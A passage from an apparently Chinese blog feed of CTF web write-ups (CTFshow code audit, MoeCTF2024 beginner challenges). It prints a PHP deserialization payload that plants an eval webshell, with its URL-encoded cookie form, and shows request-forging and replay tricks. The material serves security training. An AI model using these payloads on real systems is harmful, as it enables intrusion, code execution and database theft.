single-quoted-string">'/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>虽然过滤很狠，但是多了个class.php文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>然后在checklogin.php文件中发现了反序列化操作</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'fun.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$user_cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>直接构造反序列化字符</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST['attack']);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>因为cookie中将”作为截断符号，所需要编码绕过，这里采用url编码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>user<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>a<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A31<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token keyword">eval</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">27</span>attack<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>然后用蚁剑连接，因为账号密码已经给了，所以直接连接数据库就行(注意本地下载的sql密码和真正的不一样)</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-web</title>
      <link href="/2024/08/10/MoeCTF2024-web/"/>
      <url>/2024/08/10/MoeCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h4><p><img src="ProveYourLove.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># 源码&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;表白墙&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;style&gt;        body &#123;            font-family: Arial, sans-serif;            margin: 20px;            padding: 0;            background-image: url(&#39;static&#x2F;image.jpg&#39;);            background-size: cover;            background-repeat: no-repeat;            background-position: center center;            color: #fff;        &#125;        .container &#123;            max-width: 600px;            margin: 0 auto;            background: rgba(0, 0, 0, 0.6); &#x2F;* 半透明背景 *&#x2F;            padding: 20px;            border-radius: 8px;        &#125;        h1 &#123;            text-align: center;            margin-top: 0;        &#125;        form &#123;            margin-bottom: 20px;        &#125;        label &#123;            display: block;            margin-top: 10px;        &#125;        input[type&#x3D;&quot;text&quot;], textarea, select &#123;            width: calc(100% - 16px); &#x2F;* 统一宽度，减去内边距 *&#x2F;            padding: 8px;            margin-top: 5px;            border-radius: 4px;            border: 1px solid #ddd;            background-color: rgba(255, 255, 255, 0.2); &#x2F;* 半透明背景 *&#x2F;            color: #fff;            box-sizing: border-box; &#x2F;* 确保宽度包括内边距和边框 *&#x2F;        &#125;        textarea &#123;            width: calc(100% - 16px); &#x2F;* 确保文本区域宽度一致 *&#x2F;        &#125;        input[type&#x3D;&quot;submit&quot;] &#123;            margin-top: 10px;            padding: 10px 20px;            font-size: 16px;            background-color: #4CAF50;            color: white;            border: none;            border-radius: 4px;            cursor: pointer;        &#125;        input[type&#x3D;&quot;submit&quot;]:hover &#123;            background-color: #45a049;        &#125;        .status &#123;            margin-top: 20px;            text-align: center;            font-size: 18px;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;container&quot;&gt;        &lt;h1&gt;表白墙&lt;&#x2F;h1&gt;        &lt;form id&#x3D;&quot;confessionForm&quot;&gt;            &lt;label for&#x3D;&quot;nickname&quot;&gt;昵称:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;nickname&quot; name&#x3D;&quot;nickname&quot; required placeholder&#x3D;&quot;输入您的昵称&quot;&gt;            &lt;label for&#x3D;&quot;user_gender&quot;&gt;您的性别:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;user_gender&quot; name&#x3D;&quot;user_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;男&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;女&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;其他&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;target&quot;&gt;表白对象:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;target&quot; name&#x3D;&quot;target&quot; required placeholder&#x3D;&quot;输入您表白的对象&quot;&gt;            &lt;label for&#x3D;&quot;target_gender&quot;&gt;表白对象的性别:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;target_gender&quot; name&#x3D;&quot;target_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;男&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;女&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;其他&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;message&quot;&gt;表白内容:&lt;&#x2F;label&gt;            &lt;textarea id&#x3D;&quot;message&quot; name&#x3D;&quot;message&quot; rows&#x3D;&quot;6&quot; required placeholder&#x3D;&quot;输入您的表白内容&quot;&gt;&lt;&#x2F;textarea&gt;            &lt;label for&#x3D;&quot;anonymous&quot;&gt;是否匿名:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;anonymous&quot; name&#x3D;&quot;anonymous&quot; required&gt;                &lt;option value&#x3D;&quot;false&quot;&gt;不匿名&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;true&quot;&gt;匿名&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交表白&quot;&gt;        &lt;&#x2F;form&gt;        &lt;div class&#x3D;&quot;status&quot;&gt;            当前表白份数: &lt;span id&#x3D;&quot;confessionCount&quot;&gt;加载中...&lt;&#x2F;span&gt;&lt;br&gt;            flag: &lt;span id&#x3D;&quot;flag&quot;&gt;访问confession_count获取&lt;&#x2F;span&gt;&lt;br&gt;            Qixi_flag: &lt;span id&#x3D;&quot;Qixi_flag&quot;&gt;访问questionnaire_count获取&lt;&#x2F;span&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;script&gt;        document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123;            &#x2F;&#x2F; 获取当前表白份数            fetch(&#39;&#x2F;confession_count&#39;)                .then(response &#x3D;&gt; response.json())                .then(data &#x3D;&gt; &#123;                    document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                    document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                    document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                &#125;)                .catch(error &#x3D;&gt; &#123;                    console.error(&#39;Error:&#39;, error);                &#125;);        &#125;);        document.getElementById(&#39;confessionForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;            event.preventDefault(); &#x2F;&#x2F; 阻止表单的默认提交行为            &#x2F;&#x2F; 检查设备是否已提交过表白            if (localStorage.getItem(&#39;confessionSubmitted&#39;)) &#123;                alert(&#39;您已经提交过表白，不能重复提交。&#39;);                return;            &#125;            &#x2F;&#x2F; 发起 OPTIONS 请求            fetch(&#39;&#x2F;questionnaire&#39;, &#123;                method: &#39;OPTIONS&#39;            &#125;)            .then(response &#x3D;&gt; &#123;                if (!response.ok) &#123;                    throw new Error(&#39;OPTIONS 请求失败&#39;);                &#125;                &#x2F;&#x2F; 获取表单数据                const formData &#x3D; new FormData(event.target);                const data &#x3D; &#123;&#125;;                formData.forEach((value, key) &#x3D;&gt; &#123;                    data[key] &#x3D; value;                &#125;);                &#x2F;&#x2F; 提交表白数据                return fetch(&#39;&#x2F;questionnaire&#39;, &#123;                    method: &#39;POST&#39;,                    headers: &#123;                        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;                    &#125;,                    body: JSON.stringify(data)                &#125;);            &#125;)            .then(response &#x3D;&gt; response.json())            .then(result &#x3D;&gt; &#123;                if (result.success) &#123;                    alert(&#39;表白提交成功！&#39;);                    localStorage.setItem(&#39;confessionSubmitted&#39;, &#39;true&#39;);                    &#x2F;&#x2F; 更新表白份数                    fetch(&#39;&#x2F;confession_count&#39;)                        .then(response &#x3D;&gt; response.json())                        .then(data &#x3D;&gt; &#123;                            document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                            document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                            document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                        &#125;)                        .catch(error &#x3D;&gt; &#123;                            console.error(&#39;Error:&#39;, error);                        &#125;);                &#125; else &#123;                    alert(&#39;表白提交失败，请稍后重试。&#39;);                &#125;            &#125;)            .catch(error &#x3D;&gt; &#123;                console.error(&#39;Error:&#39;, error);            &#125;);        &#125;);    &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>题目给了Hint，必须发送300次才可以得到flag</p><p>问题在于，每次发送后会在本地储存<code>confessionSubmitted=true</code>这样的话第二次储存就会不允许发送</p><p>于是只要在发起请求的时候加上 <code>Cache-Control: no-store</code>来阻止进行本地储存，使用burp发送300遍即可得到flag</p><pre class="language-markup" data-language="markup"><code class="language-markup">当前表白份数: 329flag: moectf&#123;c0NgRaTuL@tioNs-ON-6EC0M1Ng-4-Lick1NG_dOG48&#125;Qixi_flag: moeCTF&#123;Happy_Chin3s3_Va13ntin3's_Day,_Baby.&#125;</code></pre><h4 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h4><p> <strong>web 七龙珠</strong></p><p>欢迎来到弗拉格之地进行 web 七龙珠试炼</p><p>在这里，你将根据引导，完成数个任务，从而获得名为 flag 的东西</p><p>本次我们采用一个叫做分段 flag 的东西，将 flag 分为七颗龙珠，集齐七颗龙珠就可以获得最终的 flag</p><p>在这次挑战中，请随时准备好你的记事本哦</p><p>现在我们开始，提示在下面 ↓</p><p>&#x2F;flag1ab.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>flag1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>至少你会跳转 url (bushi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>现在是第一道题，我们学习的是： html <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这行字的下面一片空白，但是真的什么也没有吗？<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--></span><span class="token comment">&lt;!--flag1: bW9lY3Rm--></span><span class="token comment">&lt;!--下一步：/flag2hh.php--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>恭喜你已经学会了如何查看网页源代码，但这还不够</p><p>这是第二题，本题关键词： http </p><p>想想服务器通过网络传输过来的，除了这个页面，还有什么？</p><pre class="language-http" data-language="http"><code class="language-http"># 抓包<span class="token header"><span class="token header-name keyword">flag2</span><span class="token punctuation">:</span> <span class="token header-value">e0FmdEV</span></span><span class="token header"><span class="token header-name keyword">nextpage</span><span class="token punctuation">:</span> <span class="token header-value">/flag3cad.php</span></span></code></pre><p>我想，你应该已经知道 devtools 这个东西了。(不知道也没关系，你 f12 出来的就是 devtools)</p><p>那么现在在你面前的有两个教程：</p><p>\1. 尝试把 devtools 运用熟练</p><p>\2. 尝试下载一个别的什么玩意来使用</p><p>这题，我们还是学习 http</p><p>那么，我们来试一下同时把下面要求完成吧！</p><p>-————————————————————————–</p><p>请用 GET 方法传入一个 a 参数<br>再用 POST 方法传入一个 b 参数<br>你需要使用 admin 的身份验证</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜你已经基本掌握了 http 的最最最基础知识，先去下一关吧flag3: yX3RoMXN</code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag3cad.php?a=1</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8846</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=admin</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">3</span></span>b=1</code></pre><p>虽然但是，响应头有个<code>fxxk: /flag3.php</code></p><p>啊？难道你不是从 <a href="http://localhost:8080/flag3cad.php?a=1">http://localhost:8080/flag3cad.php?a=1</a> 点击链接过来的吗？<br>坏了，肯定是哪里搞错了，要不你看看能不能自己临时凑合凑合？</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:8080/flag3cad.php?a=1</span></span></code></pre><p><img src="7ball_3.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;flag4&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;ok, 你成功闯入了第四关！&lt;br&gt;本关考验你听声辩位的功夫，你需要按下开始按钮后，根据提示按下相应的按钮。&lt;br&gt;&lt;button onclick&#x3D;&quot;start()&quot;&gt;开始&lt;&#x2F;button&gt;&lt;span id&#x3D;&quot;num&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;div id&#x3D;&quot;scope&quot;&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;1&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;2&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;3&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;4&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;5&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;6&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;7&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;8&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;script&gt;    var buttons &#x3D; document.getElementById(&quot;scope&quot;).getElementsByTagName(&quot;button&quot;);    for (var i &#x3D; 0; i &lt; buttons.length; i++) &#123;        buttons[i].id &#x3D; i + 1;    &#125;    function start() &#123;        document.getElementById(&quot;num&quot;).innerText &#x3D; &quot;9&quot;;    &#125;    function getID(button) &#123;        if (button.id &#x3D;&#x3D; 9) &#123;            alert(&quot;你过关！（铜人震声）\n我们使用 console.log 来为你生成 flag&quot;);            fetch(&#39;flag4bbc.php&#39;, &#123;                method: &#39;post&#39;,                body: &#39;method&#x3D;get&#39;,                headers: &#123;                    &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,                &#125;,            &#125;).then((data) &#x3D;&gt; &#123;                return data.json();            &#125;).then((result) &#x3D;&gt; &#123;console.log(result.hint);                console.log(result.fll);                console.log(result.goto)            &#125;);        &#125; else &#123;            alert(&quot;该罚！(头部碰撞声)&quot;)        &#125;    &#125;&lt;&#x2F;script&gt;</code></pre><p>添加一个button即可</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜你！你已经知道，前端的一切都是可以更改的！ flag4: fdFVUMHJ前往：/flag5sxr.php</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"form"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>content <span class="token operator">==</span> <span class="token string">"I want flag"</span><span class="token punctuation">)</span> 